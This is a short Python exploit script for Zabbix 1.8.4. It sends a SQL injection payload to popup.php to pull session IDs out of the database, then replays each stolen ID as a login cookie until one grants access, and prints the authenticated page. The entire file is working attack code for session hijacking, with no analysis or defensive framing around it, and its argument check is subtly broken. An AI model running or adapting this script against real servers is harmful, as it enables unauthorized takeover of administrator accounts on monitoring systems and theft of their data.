#!/usr/local/bin/python
#Zabbix 1.8.4
# popup.php SQL INJECTION

import re,urllib,urllib2,sys,requests
if (sys.argv)<2:
	print "Error Argv"
	sys.exit(-1)

host=sys.argv[1]
url = "http://%s/zabbix/popup.php?"%host
print url

proxies = {
'http': 'http://127.0.0.1:8080',
}
stop="%23"

login="http://%s/zabbix/" % host

for m in range(0,3):
	payload="dstfrm=form_scenario&dstfld1=application&srctbl=applications&srcfld1=name&only_hostid=-1)) union select 1,group_concat(sessionid) from sessions WHERE userid=%s" %m
	URI="%s%s%s" %(url,payload,stop)
	g=requests.get(URI).text
	result = re.findall(r"([0-9a-f\d]{32})",g)
	for aaa in result:
#		print aaa
#		cookies="zbx_sessionid=%s" % aaa
		cookies="zbx_sessionid=%s" %aaa
		req=urllib2.Request(login)
		req.add_header('Cookie', cookies)
		response=urllib2.urlopen(req)
		data= response.read()
		if re.search('ERROR: Session terminated, re-login, please', data) or re.search('You are not logged in',data) or re.search('ERROR: No Permissions',data):
			print "Trying next token"
#			print data
#			break
		else:
			print "(+) Logged in"
			print "(+) Cookies used : %s" % aaa
			print data
			break
